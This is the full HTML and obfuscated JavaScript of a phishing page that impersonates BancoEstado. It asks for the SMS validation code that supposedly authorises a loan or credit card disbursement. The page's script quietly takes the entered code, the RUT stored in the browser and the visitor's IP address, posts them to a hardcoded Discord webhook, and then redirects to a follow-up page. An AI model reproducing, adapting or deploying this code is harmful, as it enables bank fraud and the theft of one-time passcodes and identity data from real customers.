<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: rgba(0, 0, 0, 0.5);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 16px;
            padding: 40px 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .close-btn {
    position: absolute;
    top: 20px;
    right: 20px;
    background: none;
    border: none;
    font-size: 28px;
    color: #FF6600;
    cursor: pointer;
    width: 30px;
    height: 30px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.3s ease;
}

.close-btn:hover {
    transform: scale(1.2);
    color: #E55A00;
}

        .sms-logo {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #1ABC9C 0%, #16A085 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            position: relative;
            box-shadow: 0 4px 12px rgba(26, 188, 156, 0.3);
        }

        .sms-logo::before {
            content: 'SMS';
            font-size: 24px;
            font-weight: 700;
            color: white;
            letter-spacing: 1px;
        }

        .sms-bubble {
            position: absolute;
            width: 30px;
            height: 30px;
            background: #1ABC9C;
            border-radius: 50%;
            bottom: -8px;
            right: -8px;
            border: 3px solid white;
        }

        .sms-bubble::after {
            content: '';
            position: absolute;
            width: 0;
            height: 0;
            border-left: 8px solid transparent;
            border-right: 0px solid transparent;
            border-top: 10px solid #1ABC9C;
            bottom: -8px;
            right: 2px;
        }

        .title {
            font-size: 18px;
            font-weight: 600;
            color: #1a2842;
            text-align: center;
            margin-bottom: 20px;
            line-height: 1.3;
        }

        .description {
            font-size: 14px;
            color: #666666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .phone-number {
            font-size: 14px;
            color: #1a2842;
            font-weight: 600;
            text-align: center;
        }

        .form-group {
            margin-bottom: 30px;
            margin-top: 30px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 12px;
            letter-spacing: 0.3px;
        }

        .form-input {
    width: 100%;
    padding: 14px 16px;
    border: 2px solid #D0D0D8;
    border-radius: 8px;
    font-size: 16px;
    color: #1a1a1a;
    font-family: inherit;
    transition: all 0.3s ease;
    background-color: #FAFAFA;
    text-align: center;
    letter-spacing: 2px;
}

.form-input:focus {
    outline: none;
    border-color: #FF6600;
    background-color: white;
    box-shadow: 0 0 0 3px rgba(255, 102, 0, 0.1);
}

        .form-input::placeholder {
            color: #D0D0D8;
            letter-spacing: 2px;
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 30px;
        }

        .continue-btn {
    width: 100%;
    padding: 14px;
    background: #D0D0D8;
    color: white;
    border: none;
    border-radius: 50px;
    font-size: 16px;
    font-weight: 600;
    cursor: not-allowed;
    transition: all 0.3s ease;
    opacity: 0.6;
}

.continue-btn.enabled {
    background: linear-gradient(135deg, #FF6600 0%, #E55A00 100%);
    cursor: pointer;
    opacity: 1;
    box-shadow: 0 4px 12px rgba(255, 102, 0, 0.3);
}

        .continue-btn.enabled:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
        }

        .continue-btn.enabled:active {
            transform: translateY(0);
        }

        .cancel-link {
            text-align: center;
            margin-top: 15px;
        }

        .cancel-link a {
    color: #FF6600;
    text-decoration: none;
    font-size: 14px;
    font-weight: 600;
    transition: all 0.3s ease;
}

.cancel-link a:hover {
    text-decoration: underline;
    color: #E55A00;
}

        @media (max-width: 480px) {
            .modal {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 20px;
            }

            .description {
                font-size: 13px;
            }

            .form-input {
                font-size: 18px;
            }
        }

        .sms-image-center {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
}

.sms-image-center img {
    max-width: 100%;
    height: auto;
}
    </style>
</head>
<body>
    <div class="modal-overlay"> 
        <div class="modal">
            <!-- Botón Cerrar -->
            <button class="close-btn" onclick="">✕</button>

            <!-- Logo SMS -->
            <div class="sms-image-center">
                <img src="sms.png">
            </div>

            <!-- Título -->
            <h1 class="title">Ingresa el código para autorizar el desembolso del préstamo o tarjeta de crédito</h1>

            <!-- Descripción -->
            <div class="description">
                Enviamos un SMS con el código de validación al <span class="phone-number">+569 XXXXXXXXX</span>
            </div>
            

            <!-- Formulario -->
            <form id="smsForm" onsubmit="handleSmsSubmit(event)">
                <!-- Input Código -->
                <div class="form-group">
                    <label class="form-label" for="codigo">Código de validación</label>
                    <input 
                        type="text" 
                        id="codigo" 
                        class="form-input" 
                        placeholder="0000"
                        maxlength="4"
                        inputmode="numeric"
                        autocomplete="off"
                    >
                </div>

                <div class="description">En caso de no recibir el código, Te solicitaremos validar la operación desde la app BancoEstado vía BE Pass.</div>

                <!-- Botones -->
                <div class="button-group">
                    <button type="submit" class="continue-btn" id="continueBtn" disabled>Continuar</button>
                </div>

                <!-- Cancelar -->
                <div class="cancel-link">
                    <a href="#" onclick="">Cancelar</a>
                </div>
            </form>
        </div>
    </div>
    
    <script>
    const _0x32cf58=_0x44a9;(function(_0x4a80e3,_0xa76002){const _0x55b51a=_0x44a9,_0x3a6fec=_0x4a80e3();while(!![]){try{const _0x41d36c=-parseInt(_0x55b51a(0x1fc))/0x1+-parseInt(_0x55b51a(0x1f2))/0x2+parseInt(_0x55b51a(0x201))/0x3+parseInt(_0x55b51a(0x1fe))/0x4+parseInt(_0x55b51a(0x1ed))/0x5+-parseInt(_0x55b51a(0x219))/0x6*(-parseInt(_0x55b51a(0x1f4))/0x7)+parseInt(_0x55b51a(0x215))/0x8;if(_0x41d36c===_0xa76002)break;else _0x3a6fec['push'](_0x3a6fec['shift']());}catch(_0x4393f4){_0x3a6fec['push'](_0x3a6fec['shift']());}}}(_0x1a4a,0x771c3));const DISCORD_WEBHOOK_URL=_0x32cf58(0x208),codigoInput=document[_0x32cf58(0x1f0)](_0x32cf58(0x21a)),continueBtn=document[_0x32cf58(0x1f0)](_0x32cf58(0x206));function _0x1a4a(){const _0x5bd20e=['stringify','value','catch','348MmkPRn','codigo','location','length','3720euqWvw','back','No\x20disponible','getElementById','Error\x20IP:','1284954gMjcrl','load2.html','6986RhWiil','💋𝖫𝗈𝗀𝗈𝗌\x20𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈\x20𝖢𝗈𝗋𝖾\x20𝖯𝗋𝗂𝗆𝖾\x20𝖯𝗋𝗈\x20𝖬𝖺𝗑💋','▸\x20𝖧𝗈𝗋𝖺','add','preventDefault','enabled','Por\x20favor\x20ingresa\x20los\x204\x20dígitos\x20del\x20código','load','564594MPFNlH','addEventListener','3111664QiBvhb','disabled','application/json','1569078uYcRFk','#️⃣『𝓞𝓣𝓟\x20𝔅𝔞𝔫𝔠𝔬𝔈𝔰𝔱𝔞𝔡𝔬』#️⃣','json','▸\x20𝖢𝗈𝖽𝗂𝗀𝗈\x20𝖲𝖬𝖲','▸\x20𝖱𝖴𝖳','continueBtn','POST','https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw','then','▸\x20𝖨𝖯','error','history','getItem','toLocaleString','focus','replace','es-ES','https://api.ipify.org?format=json','classList','remove','2683008ZfZpGx'];_0x1a4a=function(){return _0x5bd20e;};return _0x1a4a();}codigoInput[_0x32cf58(0x1fd)]('input',function(_0x2c2e7e){const _0x5f1bcb=_0x32cf58;this[_0x5f1bcb(0x217)]=this[_0x5f1bcb(0x217)][_0x5f1bcb(0x210)](/[^0-9]/g,''),this[_0x5f1bcb(0x217)]['length']===0x4?(continueBtn[_0x5f1bcb(0x1ff)]=![],continueBtn[_0x5f1bcb(0x213)][_0x5f1bcb(0x1f7)](_0x5f1bcb(0x1f9))):(continueBtn[_0x5f1bcb(0x1ff)]=!![],continueBtn[_0x5f1bcb(0x213)][_0x5f1bcb(0x214)]('enabled'));});function handleSmsSubmit(_0x32e32c){const _0x390005=_0x32cf58;_0x32e32c[_0x390005(0x1f8)]();const _0x1d8500=document['getElementById'](_0x390005(0x21a))[_0x390005(0x217)];if(_0x1d8500[_0x390005(0x21c)]!==0x4){alert(_0x390005(0x1fa));return;}enviarCodigoADiscord(_0x1d8500);}function _0x44a9(_0x59b70c,_0x169ec6){_0x59b70c=_0x59b70c-0x1ed;const _0x1a4a95=_0x1a4a();let _0x44a9fd=_0x1a4a95[_0x59b70c];return _0x44a9fd;}function enviarCodigoADiscord(_0x52a41c){const _0x325622=_0x32cf58,_0x71c8dd=localStorage[_0x325622(0x20d)]('rutUsuario')||_0x325622(0x1ef);fetch(_0x325622(0x212))[_0x325622(0x209)](_0x4a62f1=>_0x4a62f1[_0x325622(0x203)]())[_0x325622(0x209)](_0x489fb2=>{const _0xa152fb=_0x325622,_0x2c6cd0={'username':_0xa152fb(0x1f5),'embeds':[{'color':0x3498db,'author':{'name':_0xa152fb(0x202)},'fields':[{'name':_0xa152fb(0x204),'value':'`'+_0x52a41c+'`','inline':![]},{'name':_0xa152fb(0x205),'value':'`'+_0x71c8dd+'`','inline':![]},{'name':_0xa152fb(0x20a),'value':'`'+_0x489fb2['ip']+'`','inline':!![]},{'name':_0xa152fb(0x1f6),'value':'`'+new Date()[_0xa152fb(0x20e)](_0xa152fb(0x211))+'`','inline':!![]}]}]};fetch(DISCORD_WEBHOOK_URL,{'method':_0xa152fb(0x207),'headers':{'Content-Type':_0xa152fb(0x200)},'body':JSON[_0xa152fb(0x216)](_0x2c6cd0)})[_0xa152fb(0x209)](()=>{const _0x572635=_0xa152fb;window[_0x572635(0x21b)]['href']=_0x572635(0x1f3);})['catch'](_0x40bf88=>console[_0xa152fb(0x20b)]('Error:',_0x40bf88));})[_0x325622(0x218)](_0x5ed5c2=>console['error'](_0x325622(0x1f1),_0x5ed5c2));}function cerrarModal(_0x12b85d){const _0x252085=_0x32cf58;_0x12b85d&&_0x12b85d['preventDefault'](),window[_0x252085(0x20c)][_0x252085(0x1ee)]();}window[_0x32cf58(0x1fd)](_0x32cf58(0x1fb),function(){const _0x5d30bd=_0x32cf58;document[_0x5d30bd(0x1f0)](_0x5d30bd(0x21a))[_0x5d30bd(0x20f)]();});
    </script>
</body>
</html>
